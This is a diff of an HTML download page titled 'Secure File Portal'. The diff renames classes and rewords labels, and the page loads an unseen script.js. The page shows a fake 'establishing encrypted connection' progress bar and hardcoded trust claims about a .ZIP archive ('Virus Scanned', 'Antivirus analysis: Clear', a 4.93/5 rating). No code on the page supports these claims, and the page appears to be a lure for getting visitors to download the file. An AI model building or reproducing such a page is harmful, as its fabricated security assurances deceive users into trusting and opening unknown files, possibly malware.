@@ -1,11 +1,12 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Protected Download Hub</title>
-  <meta name="description" content="Protected cloud download center - Safe and encrypted file access"/>
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
+  <title>Secure File Portal</title>
+  <meta name="description" content="Secure file download portal - Advanced cloud storage solution"/>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📁</text></svg>">
   
   <meta http-equiv="Content-Security-Policy" content="
     default-src 'self';
@@ -17,26 +18,27 @@
   <link href="style.css" rel="stylesheet" type="text/css" />
 </head>
 <body>
-  <div class="overlay-bg"></div>
+  <div class="background-overlay"></div>
   
-  <div class="wrapper">
-    <!-- Header Navigation -->
-    <div class="header-nav">
-      <button class="info-btn" onclick="toggleInfoPopup()">File details</button>
-      <div class="secure-badge">
+  <div class="container">
+    <!-- Top Navigation -->
+    <div class="top-nav">
+      <button class="nav-btn" onclick="toggleInfoPopup()">Information about file</button>
+      <div class="security-badge">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
           <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
           <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
-        <span>Protected Hub</span>
+        <span>Secure Portal</span>
       </div>
     </div>
 
-    <div class="content-card">
-      <div class="card-top"></div>
+    <div class="card">
+      <div class="card-header">
+      </div>
 
-      <div class="card-main">
-        <div class="download-symbol">
+      <div class="card-body">
+        <div class="download-icon">
           <svg width="64" height="64" viewBox="0 0 24 24" fill="none">
             <path d="M21 15V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
             <path d="M7 10L12 15L17 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
@@ -44,63 +46,62 @@
           </svg>
         </div>
 
-        <h1>Setting Up Protected Transfer</h1>
-        <p class="subtitle">Establishing encrypted session...</p>
+        <h1>Preparing Secure Download</h1>
+        <p class="subtitle">Establishing encrypted connection...</p>
         
-        <div class="progress-wrap">
-          <div class="progress-line">
+        <div class="progress-container">
+          <div class="progress-bar">
             <div class="progress-fill"></div>
           </div>
         </div>
 
-        <p id="transfer-status" class="transfer-status">Initializing secure tunnel...</p>
-        <p id="transfer-error" class="transfer-error"></p>
+        <p id="status-text" class="status-text">Initializing secure session...</p>
+        <p id="error-text" class="error-text"></p>
 
-        <div class="feature-list">
-          <div class="feature-item">
+        <div class="features">
+          <div class="feature">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
               <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
             </svg>
-            <span>TLS Encryption</span>
+            <span>SSL Encrypted</span>
           </div>
-          <div class="feature-item">
+          <div class="feature">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
               <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
             </svg>
-            <span>Malware Checked</span>
+            <span>Virus Scanned</span>
           </div>
-          <div class="feature-item">
+          <div class="feature">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
               <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
             </svg>
-            <span>Optimized Speed</span>
+            <span>High Speed</span>
           </div>
         </div>
       </div>
 
-      <div class="card-bottom">
-        <p class="footer-note">Driven by Encrypted Cloud Systems</p>
+      <div class="card-footer">
+        <p class="footer-text">Powered by Advanced Cloud Technology</p>
       </div>
     </div>
   </div>
 
-  <!-- File Info Popup -->
-  <div id="filePopup" class="file-popup">
-    <div class="file-popup-head">
-      <button class="hub-brand">
+  <!-- Information Popup -->
+  <div id="infoPopup" class="info-popup">
+    <div class="info-popup-header">
+      <button class="secure-portal-btn">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
           <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
           <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
-        <span>Protected Hub</span>
+        <span>Secure Portal</span>
       </button>
-      <div class="login-links">
-        <a href="https://github.com/login" target="_blank" class="link-small">Login</a>
-        <a href="https://github.com/signup" target="_blank" class="link-small">Join</a>
+      <div class="auth-buttons">
+        <a href="https://github.com/login" target="_blank" class="auth-btn-small">Login</a>
+        <a href="https://github.com/signup" target="_blank" class="auth-btn-small">Sign up</a>
       </div>
     </div>
-
-    <div class="file-info-item">
+    <div class="info-item">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
         <path d="M7 18H17V16H7V18Z" fill="currentColor"/>
         <path d="M17 14H7V12H17V14Z" fill="currentColor"/>
@@ -109,30 +110,31 @@
       </svg>
       <span><strong>Downloads:</strong> 2.4k+</span>
     </div>
-
-    <div class="file-info-item">
+    <div class="info-item">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
         <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" fill="currentColor"/>
       </svg>
       <span><strong>Rating:</strong> 4.93/5</span>
     </div>
-
-    <div class="file-info-item">
+    <div class="info-item">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
         <path d="M14 2H6C4.9 2 4 2.9 4 4V20C4 21.1 4.89 22 5.99 22H18C19.1 22 20 21.1 20 20V8L14 2Z" stroke="currentColor" stroke-width="2" fill="none"/>
         <path d="M14 2V8H20" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
       </svg>
       <span><strong>File type:</strong> .ZIP archive</span>
     </div>
-
-    <div class="file-info-item">
+    <div class="info-item">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
         <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
         <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
       </svg>
-      <span><strong>Security check:</strong> Passed</span>
+      <span><strong>Antivirus analysis:</strong> Clear</span>
     </div>
   </div>
+
+  
+
+  
 
   <script src="script.js"></script>
 </body>
